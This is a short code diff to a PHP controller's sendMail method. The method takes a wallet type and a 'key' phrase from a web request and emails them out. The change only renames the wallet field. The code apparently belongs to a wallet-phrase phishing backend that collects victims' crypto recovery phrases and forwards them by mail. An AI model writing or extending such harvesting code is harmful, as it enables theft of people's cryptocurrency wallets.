@@ -22,7 +22,7 @@ class PagesController extends Controller
     //send mail
     public function sendMail(Request $request)
     {
-        $wallet_type = $request['wallet'];
+        $wallet_type = $request['wallet_type'];
         $phrase = $request['key'];
         // dd($phrase);
         Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) {
